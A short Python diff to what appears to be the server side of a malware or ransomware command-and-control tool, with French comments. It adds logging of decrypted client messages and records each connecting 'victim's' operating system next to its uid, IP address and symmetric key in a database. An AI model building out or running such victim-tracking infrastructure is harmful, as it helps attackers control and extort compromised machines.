@@ -100,13 +100,15 @@ def start_server(port):
 
                 cipher = AES.new(sym_key, AES.MODE_CBC, iv=iv)
                 pt = unpad(cipher.decrypt(received_data), AES.block_size).decode('utf-8')
+                print("received data : " + str(pt))
 
                 # Récupération de l'uid client
                 uid = json.loads(pt)["uid"]
+                client_os = json.loads(pt)["os"]
 
 
                 # Ajout de la victime en base de données
-                add_victim_to_db(db, mycursor, uid, addr[0], sym_key, "testupdated")
+                add_victim_to_db(db, mycursor, uid, client_os, addr[0], sym_key, "testupdated")
 
                 # # Vérification de l'uid dans la base de données
                 # query = "SELECT * FROM victims WHERE uid = %s"
@@ -143,7 +145,8 @@ def start_server(port):
                                     reception_queue = reception_queue, 
                                     sym_key = sym_key, 
                                     iv = iv,
-                                    uid = uid
+                                    uid = uid,
+                                    os = client_os
                                 ))
 
 
